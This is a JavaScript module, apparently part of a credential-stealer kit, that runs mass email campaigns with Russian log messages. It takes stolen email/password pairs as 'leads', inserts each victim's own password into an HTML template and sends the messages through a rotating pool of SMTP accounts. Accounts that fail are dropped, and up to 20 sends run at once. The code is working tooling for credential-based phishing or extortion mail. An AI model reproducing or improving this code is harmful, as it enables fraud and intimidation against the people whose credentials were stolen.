'use strict';

const mailService = require('./mailService');

const MAILER_CAMPAIGN_LOG_MAX = 500;
const MAILER_CAMPAIGN_MAX_CONCURRENT_SENDS = 20;

const mailerCampaignState = {
  running: false,
  paused: false,
  stopped: false,
  activeSendCount: 0,
  leads: [],
  total: 0,
  sent: 0,
  failed: 0,
  cursor: 0,
  delayMs: 1500,
  numThreads: 1,
  configId: null,
  configName: '',
  smtpList: [],
  smtpRotation: 0,
  cfg: null,
  log: [],
};

function clampInt(v, min, max, fallback) {
  const n = typeof v === 'number' ? v : parseInt(v, 10);
  if (!Number.isFinite(n)) return fallback;
  if (n < min) return min;
  if (n > max) return max;
  return n;
}

function clampFloat(v, min, max, fallback) {
  const n = typeof v === 'number' ? v : parseFloat(v);
  if (!Number.isFinite(n)) return fallback;
  if (n < min) return min;
  if (n > max) return max;
  return n;
}

function pushLog(text, type) {
  mailerCampaignState.log.push({ text: String(text || ''), type: type || '' });
  if (mailerCampaignState.log.length > MAILER_CAMPAIGN_LOG_MAX) {
    mailerCampaignState.log = mailerCampaignState.log.slice(-MAILER_CAMPAIGN_LOG_MAX);
  }
}

function sanitizeRecipients(recipients) {
  if (!Array.isArray(recipients)) return [];
  const out = [];
  for (let i = 0; i < recipients.length; i++) {
    const r = recipients[i] || {};
    const email = String(r.email || '').trim();
    if (!email) continue;
    out.push({
      email: email,
      password: String(r.password || ''),
    });
  }
  return out;
}

function pickStealerConfig(configId) {
  const data = mailService.readStealerEmailConfig();
  let cfg = null;
  if (configId) {
    cfg = (data.configs || []).find(function (c) { return String(c.id) === String(configId); }) || null;
  }
  if (!cfg) cfg = data.current || null;
  if (!cfg || !(cfg.smtpLine && String(cfg.smtpLine).trim())) {
    cfg = (data.configs || []).find(function (c) { return c.smtpLine && String(c.smtpLine).trim(); }) || null;
  }
  return cfg;
}

function buildMailHtmlAndAttachments(cfg, toEmail, password) {
  let html = (cfg.html || '')
    .replace(/_email_/g, toEmail)
    .replace(/_password_/g, password || '');
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      const cid = 'image1@mail';
      html = html.replace(/_src1_/g, 'cid:' + cid);
      attachments.push({ filename: 'image1.png', content: buf, cid: cid });
    } catch (_) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  return { html, attachments };
}

function pickJobSync() {
  if (mailerCampaignState.cursor >= mailerCampaignState.total) return 'done';
  if (!mailerCampaignState.smtpList.length) return 'empty';
  const idx = mailerCampaignState.cursor++;
  const lead = mailerCampaignState.leads[idx];
  const toEmail = String(lead && lead.email ? lead.email : '').trim();
  if (!toEmail) return { skip: true };
  const password = String(lead && lead.password ? lead.password : '');
  const smtpIdx = mailerCampaignState.smtpRotation % mailerCampaignState.smtpList.length;
  mailerCampaignState.smtpRotation = (mailerCampaignState.smtpRotation + 1) | 0;
  const smtp = mailerCampaignState.smtpList[smtpIdx];
  return { idx, toEmail, password, smtp };
}

function schedulePump() {
  setImmediate(runPump);
}

function runPump() {
  if (mailerCampaignState.stopped) {
    if (mailerCampaignState.activeSendCount <= 0) {
      mailerCampaignState.running = false;
      pushLog('Рассылка остановлена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'muted');
    }
    return;
  }
  if (!mailerCampaignState.running) return;
  if (mailerCampaignState.paused) {
    setTimeout(schedulePump, 500);
    return;
  }
  const maxConcurrent = Math.min(
    MAILER_CAMPAIGN_MAX_CONCURRENT_SENDS,
    Math.max(1, mailerCampaignState.numThreads | 0)
  );
  while (
    mailerCampaignState.running
    && !mailerCampaignState.paused
    && !mailerCampaignState.stopped
    && mailerCampaignState.activeSendCount < maxConcurrent
  ) {
    const job = pickJobSync();
    if (job === 'done') {
      if (mailerCampaignState.activeSendCount <= 0) {
        mailerCampaignState.running = false;
        pushLog('Рассылка завершена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'success');
      }
      return;
    }
    if (job === 'empty') {
      mailerCampaignState.running = false;
      pushLog('Рассылка завершена: нет доступных SMTP.', 'error');
      return;
    }
    if (job.skip) {
      mailerCampaignState.sent++;
      continue;
    }
    const nodemailer = mailService.getNodemailer();
    if (!nodemailer) {
      mailerCampaignState.running = false;
      pushLog('Ошибка: nodemailer не установлен.', 'error');
      return;
    }
    const smtp = job.smtp;
    const cfg = mailerCampaignState.cfg || {};
    const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
    const built = buildMailHtmlAndAttachments(cfg, job.toEmail, job.password);
    const transporter = nodemailer.createTransport({
      host: smtp.host,
      port: smtp.port,
      secure: smtp.port === 465,
      auth: { user: smtp.user, pass: smtp.password }
    });
    const mailOptions = {
      from: fromStr,
      to: job.toEmail,
      subject: (cfg.title || '').trim() || 'Message',
      html: built.html,
      attachments: built.attachments.length ? built.attachments : undefined,
      envelope: { from: smtp.fromEmail, to: job.toEmail }
    };
    mailerCampaignState.activeSendCount++;
    transporter.sendMail(mailOptions).then(function () {
      mailerCampaignState.sent++;
      const num = job.idx + 1;
      pushLog('Отправлено ' + num + '/' + mailerCampaignState.total + ': с ' + smtp.fromEmail + ' на ' + job.toEmail, 'success');
    }).catch(function (err) {
      mailerCampaignState.failed++;
      const msg = (err && err.message ? String(err.message) : String(err || 'send error')).slice(0, 200);
      pushLog('Ошибка отправки на ' + job.toEmail + ': ' + msg, 'error');
      mailService.sendStealerFailedSmtpEmails.add(smtp.fromEmail);
    }).finally(function () {
      mailerCampaignState.activeSendCount--;
      if (mailerCampaignState.stopped || !mailerCampaignState.running) {
        if (mailerCampaignState.activeSendCount <= 0 && mailerCampaignState.stopped) {
          mailerCampaignState.running = false;
        }
        return;
      }
      if (mailerCampaignState.cursor >= mailerCampaignState.total && mailerCampaignState.activeSendCount <= 0) {
        mailerCampaignState.running = false;
        pushLog('Рассылка завершена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'success');
        return;
      }
      setTimeout(schedulePump, mailerCampaignState.delayMs);
    });
  }
}

function startCampaign(payload) {
  if (mailerCampaignState.running) {
    return { ok: false, statusCode: 400, error: 'Рассылка уже запущена' };
  }
  const nodemailer = mailService.getNodemailer();
  if (!nodemailer) {
    return { ok: false, statusCode: 500, error: 'nodemailer not installed' };
  }
  const recipients = sanitizeRecipients(payload && payload.recipients);
  if (!recipients.length) {
    return { ok: false, statusCode: 400, error: 'Нет получателей. Заполните базу email.' };
  }
  const configId = payload && payload.configId ? String(payload.configId).trim() : null;
  const cfg = pickStealerConfig(configId);
  if (!cfg || !(cfg.smtpLine && String(cfg.smtpLine).trim())) {
    return { ok: false, statusCode: 400, error: 'В конфиге не задан SMTP.' };
  }
  const smtpList = mailService.parseSmtpLines(cfg.smtpLine).filter(function (s) {
    return !mailService.sendStealerFailedSmtpEmails.has(s.fromEmail);
  });
  if (!smtpList.length) {
    return { ok: false, statusCode: 400, error: 'Нет доступных SMTP (все отключены после ошибок).' };
  }
  const numThreads = clampInt(payload && payload.numThreads, 1, 20, 1);
  const delaySec = clampFloat(payload && payload.delaySec, 0.5, 60, 1.5);
  mailerCampaignState.running = true;
  mailerCampaignState.paused = false;
  mailerCampaignState.stopped = false;
  mailerCampaignState.activeSendCount = 0;
  mailerCampaignState.leads = recipients;
  mailerCampaignState.total = recipients.length;
  mailerCampaignState.sent = 0;
  mailerCampaignState.failed = 0;
  mailerCampaignState.cursor = 0;
  mailerCampaignState.delayMs = Math.round(delaySec * 1000);
  mailerCampaignState.numThreads = numThreads;
  mailerCampaignState.configId = cfg.id || null;
  mailerCampaignState.configName = cfg.name || '';
  mailerCampaignState.smtpList = smtpList;
  mailerCampaignState.smtpRotation = 0;
  mailerCampaignState.cfg = cfg;
  mailerCampaignState.log = [];
  pushLog('Рассылка запущена. Всего: ' + recipients.length + ', потоков: ' + numThreads + ', задержка: ' + delaySec + ' сек.', 'muted');
  schedulePump();
  return { ok: true };
}

function pauseCampaign(payload) {
  if (!mailerCampaignState.running) return { ok: true, paused: false };
  const wasPaused = mailerCampaignState.paused;
  mailerCampaignState.paused = !mailerCampaignState.paused;
  if (wasPaused && !mailerCampaignState.paused) {
    mailerCampaignState.numThreads = clampInt(payload && payload.numThreads, 1, 20, mailerCampaignState.numThreads || 1);
    const delaySec = clampFloat(payload && payload.delaySec, 0.5, 60, mailerCampaignState.delayMs / 1000 || 1.5);
    mailerCampaignState.delayMs = Math.round(delaySec * 1000);
    pushLog('Рассылка продолжена.', 'muted');
    schedulePump();
  } else if (mailerCampaignState.paused) {
    pushLog('Рассылка на паузе. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'muted');
  }
  return { ok: true, paused: mailerCampaignState.paused };
}

function stopCampaign() {
  if (!mailerCampaignState.running && !mailerCampaignState.paused) return { ok: true };
  mailerCampaignState.stopped = true;
  mailerCampaignState.paused = false;
  mailerCampaignState.running = false;
  if (mailerCampaignState.activeSendCount <= 0) {
    pushLog('Рассылка остановлена. Отправлено ' + mailerCampaignState.sent + ' из ' + mailerCampaignState.total + '.', 'muted');
  }
  return { ok: true };
}

function getStatus() {
  return {
    running: !!mailerCampaignState.running,
    paused: !!mailerCampaignState.paused,
    stopped: !!mailerCampaignState.stopped,
    sent: mailerCampaignState.sent | 0,
    failed: mailerCampaignState.failed | 0,
    total: mailerCampaignState.total | 0,
    activeSendCount: mailerCampaignState.activeSendCount | 0,
    numThreads: mailerCampaignState.numThreads | 0,
    delayMs: mailerCampaignState.delayMs | 0,
    configId: mailerCampaignState.configId,
    configName: mailerCampaignState.configName || '',
    log: mailerCampaignState.log.slice(-MAILER_CAMPAIGN_LOG_MAX),
  };
}

function clearLog() {
  mailerCampaignState.log = [];
}

module.exports = {
  MAILER_CAMPAIGN_LOG_MAX,
  MAILER_CAMPAIGN_MAX_CONCURRENT_SENDS,
  mailerCampaignState,
  startCampaign,
  pauseCampaign,
  stopCampaign,
  getStatus,
  clearLog,
};
